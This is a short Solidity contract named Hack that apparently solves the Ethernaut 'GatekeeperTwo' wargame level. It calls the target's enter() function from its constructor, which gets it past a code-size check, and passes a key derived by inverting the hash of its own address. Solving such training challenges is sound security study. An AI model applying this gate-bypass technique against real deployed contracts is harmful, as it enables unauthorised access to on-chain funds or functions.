// SPDX-License-Identifier: WTFPL
pragma solidity 0.8.7;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Hack {
    constructor(address contractAddress) {
        bytes8 key = ~bytes8(keccak256(abi.encodePacked(address(this))));
        IGatekeeperTwo(contractAddress).enter(key);
    }
}